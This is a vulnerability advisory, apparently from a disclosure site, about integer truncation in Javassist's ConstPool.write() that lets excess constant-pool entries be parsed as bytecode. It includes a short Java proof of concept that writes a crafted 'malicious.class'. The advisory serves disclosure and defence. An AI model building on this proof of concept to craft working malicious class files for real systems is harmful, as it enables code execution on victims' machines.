{"hash":"3cba36b87cd119565cf4bd3183f717264cf88917","data":{"post":{"title":"Javassist local code execution","path":"/vulnerabilities/javassist-lce/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>Integer truncation in Javassist leads to local code execution</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p><a href=\"https://github.com/jboss-javassist/javassist\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Javassist</a></p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>Javassist (,3.29.1)</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>The issue lies in the write() function of the ConstPool object. When writing the ConstPool into a class file, the length field is written as a short integer, but the numOfItems Variable is not checked to see if it is bigger than the maximum value of short (65535). If we try to write a class file with a ConstPool bigger than 65535, the elements from position 65535 onwards wouldnâ€™t be considered as part of the ConstPool, and will be interpreted as arbitrary bytecode. An attacker that can insert arbitrary integers into a classfile, could use this to insert malicious bytecode to the class, for example a constructor which will cause code execution when the class file is loaded</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<pre><code class=\"language-java\">import javassist.NotFoundException; \nimport javassist.bytecode.ClassFile; \nimport javassist.bytecode.ConstPool; \nimport java.io.DataOutputStream; \nimport java.io.File;\n\nimport java.io.FileOutputStream; \nimport java.io.IOException; \npublic class JavassistIntTruncationExample \n{ \n    public static void main(String argv[]) throws IOException, NotFoundException { \n        File yourFile = new File(\"malicious.class\"); \n        yourFile.createNewFile(); \n        FileOutputStream oFile = new FileOutputStream(yourFile, false); DataOutputStream stream = new DataOutputStream(oFile); \n        ClassFile clazz_file_before_write = new \n        ClassFile(false,\"test\",null); \n        ConstPool pool_before_write = \n        clazz_file_before_write.getConstPool(); \n        // Adding enough ints to cause integer truncation \n        for(int i = 0; i&#x3C; 65527; i++) { \n            pool_before_write.addIntegerInfo(0xcafebabe); \n        } \n        // BUG: This integer will be added as arbitrary bytecode! \n        pool_before_write.addIntegerInfo(0xdeadbeef); \n        System.out.println(\"Constpool size\" + pool_before_write.getSize()); clazz_file_before_write.write(stream); \n    } \n} \n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/jboss-javassist/javassist/issues/423\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GitHub issue</a></p>\n","description":"Low severity. Integer truncation in Javassist leads to local code execution","date_published":"2022-08-11","xray_id":"","vul_id":"","severity":"low","discovered_by":"Omer Kaspi","last_updated":"2022-08-11","cvss":6.4}},"context":{}}